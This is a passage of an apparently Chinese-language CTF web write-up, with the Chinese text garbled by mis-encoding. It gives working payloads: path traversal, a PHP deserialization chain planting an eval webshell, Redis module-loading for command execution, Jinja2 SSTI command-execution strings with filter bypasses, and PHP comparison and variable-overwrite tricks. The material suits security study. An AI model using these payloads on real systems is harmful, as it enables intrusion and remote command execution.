class=\"line\"><span class=\"comment\">/*payload:</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">?file=hint.php?../../../../../../ffffllllaaaagggg</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">file=hint.php%3f../../../../../../ffffllllaaaagggg Â %3fæ˜¯?çš„urlç¼–ç </span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"17å¤©ç¿¼æ¯-2021esay_evalredis\"><a class=\"markdownIt-Anchor\" href=\"#17å¤©ç¿¼æ¯-2021esay_evalredis\">#</a> 17.[å¤©ç¿¼æ¯ 2021] esay_evalâ€“REDIS]</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$code</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;code=<span class=\"string\">&quot;eval(\\$_POST[1]);&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;a=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">A</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">b</span>());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>è¿™é¢˜é“¾å­ä¸éš¾æ‰¾ï¼Œç»•è¿‡ wakeup çš„æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ç”¨å¤§å°å†™ç»•è¿‡<br>\nå­¦ä¹ ä¸€ä¸ªæ–°çŸ¥è¯†:redis ææƒ<br>\nï¼[[Pasted image 20230502170947.png]]<br>\n antsword è¿æ¥ä¸Šå»åå‘ç°ä¸èƒ½è®¿é—®å…¶ä»–ç›®å½•ï¼Œå‘ç°ä¸€ä¸ª config.php.swp å†…å®¹æœ‰ redis å¯†ç <br>\nèšå‰‘ Redis æ’ä»¶åœ°å€ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>\n<p>git clone åˆ° antData/plugins ä¸‹<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1leHAtcDE4ZHZiMmw0OWQuc28=\">ä¸Šä¼ ä¸€ä¸ª exp.so</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ–‡ä»¶åœ°å€ï¼šhttps://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>\n<p>èšå‰‘è¿ä¸Šæ’ä»¶åæ·»åŠ æ•°æ®å¯†ç å¡«æ–‡ä»¶é‡Œçš„<br>\nç›´æ¥æ‰§è¡Œå‘½ä»¤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MODULE LOAD /var/www/html/exp.so</span><br><span class=\"line\">system.exec &quot;å‘½ä»¤&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"18å®‰æ´µæ¯-2020normal-ssti\"><a class=\"markdownIt-Anchor\" href=\"#18å®‰æ´µæ¯-2020normal-ssti\">#</a> 18.[å®‰æ´µæ¯ 2020] Normal SSTI</h3>\n<p>æ­¤é¢˜è€ƒç‚¹ unicode ç¼–ç ç»•è¿‡ï¼Œssti è¿‡æ»¤<br>\nå…ˆæµ‹è¯•ä¸€ä¸‹å‘ç°è¿‡æ»¤äº† <code>&#123;&#123;&#125;&#125;,ç©ºæ ¼,ç‚¹å·</code> <br>\nå…ˆæ‰¾ä¸€ä¸ªé€šç”¨ payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>\n<p>ç‚¹å·å¯ä»¥ç”¨ attr ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>\n<p>ä½†æ˜¯æ­¤é¢˜è¿˜è¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œè¿™é‡Œè§£é”ä¸€ç§æ–°çš„ç»•è¿‡æ–¹æ³•ï¼šUnicode ç¼–ç ç»•è¿‡<br>\nå…ˆç”¨ gpt å†™ä¸€æ®µè„šæœ¬:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å®šä¹‰ä¸€ä¸ªç©ºåˆ—è¡¨ï¼Œç”¨äºå­˜å‚¨æ¯ä¸ªå­—ç¬¦çš„Unicodeç¼–ç   </span></span><br><span class=\"line\">unicode_lst = []  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># è¾“å…¥éœ€è¦è½¬æ¢çš„å­—ç¬¦ä¸²  </span></span><br><span class=\"line\">input_str = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;è¯·è¾“å…¥è¦è½¬æ¢çš„å­—ç¬¦ä¸²ï¼š&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># éå†è¾“å…¥å­—ç¬¦ä¸²ï¼Œå¹¶å°†æ¯ä¸ªå­—ç¬¦çš„Unicodeç¼–ç æŒ‰ç…§ \\uXXXX çš„å½¢å¼å­˜å‚¨åˆ°unicode_lståˆ—è¡¨ä¸­  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> input_str:  </span><br><span class=\"line\">unicode_lst.append(<span class=\"string\">&quot;\\\\u%04x&quot;</span> % <span class=\"built_in\">ord</span>(char))  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># æ‰“å°è½¬æ¢ç»“æœ  </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;è½¬æ¢ç»“æœï¼š&quot;</span>, <span class=\"string\">&quot;&quot;</span>.join(unicode_lst))</span><br></pre></td></tr></table></figure>\n<p>éœ€è¦ä»€ä¹ˆè‡ªå·±è½¬æ¢å°±è¡Œäº†</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__globals__:\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f</span><br><span class=\"line\">__getitem__:\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f</span><br><span class=\"line\">æ³¨æ„å“¦è¿™é‡Œè¿˜è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—:popen,flag</span><br><span class=\"line\">popen:\\u0070\\u006f\\u0070\\u0065\\u006e</span><br><span class=\"line\">ç©ºæ ¼:\\u0020</span><br><span class=\"line\">flag:\\u0066\\u006c\\u0061\\u0067</span><br></pre></td></tr></table></figure>\n<p>åˆåœ¨ä¸€èµ·:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;os&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;cat\\u0020/\\u0066\\u006c\\u0061\\u0067&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"19hnctf-2022-week3ssssti\"><a class=\"markdownIt-Anchor\" href=\"#19hnctf-2022-week3ssssti\">#</a> 19.[HNCTF 2022 WEEK3]ssssti</h3>\n<p>æµ‹è¯•ä¸€äº›ï¼Ÿname=â€¦<br>\n å‘ç°è¿‡æ»¤å•åŒå¼•å·ï¼Œä¸‹åˆ’çº¿</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__.get(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;config[request.values.a][request.values.b][request.values.c][request.values.d].popen(request.values.e).read() &#125;&#125;&amp;a=__class__&amp;b=__init__&amp;c=__globals__&amp;d=os&amp;e=ls</span><br></pre></td></tr></table></figure>\n<h3 id=\"20gdouctf-2023ez_ze\"><a class=\"markdownIt-Anchor\" href=\"#20gdouctf-2023ez_ze\">#</a> 20.[GDOUCTF 2023]&lt;ez_ze&gt;</h3>\n<p>æµ‹è¯•å‘ç°è¿‡æ»¤äº† <code>&#123;&#123;&#125;&#125;,ç‚¹å·,ä¸‹åˆ’çº¿,åŒå¼•å·(å•å¼•å·æ²¡æœ‰è¿‡æ»¤),[],å…³é”®å­—getitem,os,popen(æ³¨æ„è¿™é‡Œçš„set)</code> <br>\n è¿™é‡Œæˆ‘ä»¬æ¥è¯•è¯• set æ–¹æ³•ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å¸¸ç”¨payload:</span><br><span class=\"line\">&#123;%print(lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure>\n<p>å¼€å¹²:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æŸ¥çœ‹ä¸‹åˆ’çº¿çš„ä½ç½®18å’Œ24</span><br><span class=\"line\">&#123;%print(lipsum|string|list)%&#125;</span><br><span class=\"line\">æ„å»ºpopå­—ç¬¦ä¸²</span><br><span class=\"line\">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;%set xhx=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join()%&#125;</span><br><span class=\"line\">&#123;%set geti=(xhx,xhx,dict(get=a)|join,dict(item=a)|join,xhx,xhx)|join%&#125;</span><br><span class=\"line\">&#123;%set oo=(dict(o=a)|join,dict(s=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;%set poe=(dict(pop=a)|join,dict(en=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;%print(lipsum|attr(globals)|attr(geti)(oo)|attr(poe)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">å†æ”¹ä¸€ä¸‹å‘½ä»¤ä¸ºcat /flagå°±è¡Œ</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"21gdouctf-2023å—ä¸äº†ä¸€ç‚¹\"><a class=\"markdownIt-Anchor\" href=\"#21gdouctf-2023å—ä¸äº†ä¸€ç‚¹\">#</a> 21.[GDOUCTF 2023] å—ä¸äº†ä¸€ç‚¹</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$b</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$a</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gdou&#x27;</span>] != <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ctf&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cookie&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cookie&#x27;</span>] == <span class=\"string\">&#x27;j0k3r&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"variable\">$aaa</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"variable\">$bbb</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;bbb&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$aaa</span> == <span class=\"number\">114514</span> &amp;&amp; <span class=\"variable\">$bbb</span> == <span class=\"number\">114514</span> &amp;&amp; <span class=\"variable\">$aaa</span> != <span class=\"variable\">$bbb</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"variable\">$give</span> = <span class=\"string\">&#x27;cancanwordflag&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"variable\">$get</span> = <span class=\"string\">&#x27;hacker!&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"variable\">$give</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>] === <span class=\"string\">&#x27;flag&#x27;</span> || <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>] === <span class=\"string\">&#x27;flag&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"variable\">$get</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">foreach</span> (<span class=\"variable\">$_POST</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"variable\">$$key</span> = <span class=\"variable\">$value</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">foreach</span> (<span class=\"variable\">$_GET</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"variable\">$$key</span> = <span class=\"variable\">$$value</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;æ´—æ´—ç¡å§&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;è¡Œä¸è¡Œå•Šç»†ç‹—&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;èœèœ&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;å°±è¿™?&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;åˆ«æ¥æ²¾è¾¹&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€ä¸ª md5 å¼ºæ¯”è¾ƒç›´æ¥æ•°ç»„ç»•è¿‡<br>\nåŠ ä¸ª cookie: <code>cookie=j0k3r</code> <br>\n ä¼ ä¸ª aaa å’Œ bbb, å…¶ä¸­ä¸€ä¸ªåœ¨æœ€ååŠ ä¸ªå­—æ¯å³å¯ï¼Œ <code>==</code>  å¼±æ¯”è¾ƒä¼šè¿›è¡Œç±»å‹è½¬æ¢<br>\næœ€åæœ‰ä¸ª foreach éå†ä¼šè¦†ç›– flag å˜é‡çš„å€¼</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get:</span><br><span class=\"line\">?aaa=114514a&amp;bbb=114514&amp;1=flag&amp;flag=1</span><br><span class=\"line\">å…ˆå°†$1=$flag,å†å°†$flag=$1</span><br><span class=\"line\">post:</span><br><span class=\"line\">gdou[]=1&amp;ctf[]=2</span><br></pre></td></tr></table></figure>\n<h3 id=\"22gdouctf-2023åæ–¹å‘çš„é’Ÿ\"><a class=\"markdownIt-Anchor\" href=\"#22gdouctf-2023åæ–¹å‘çš„é’Ÿ\">#</a> 22.[GDOUCTF 2023] åæ–¹å‘çš„é’Ÿ</h3>\n<p>æ­¤é¢˜è€ƒåˆ° php çš„å†…ç½®ç±» SplFileObject</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span 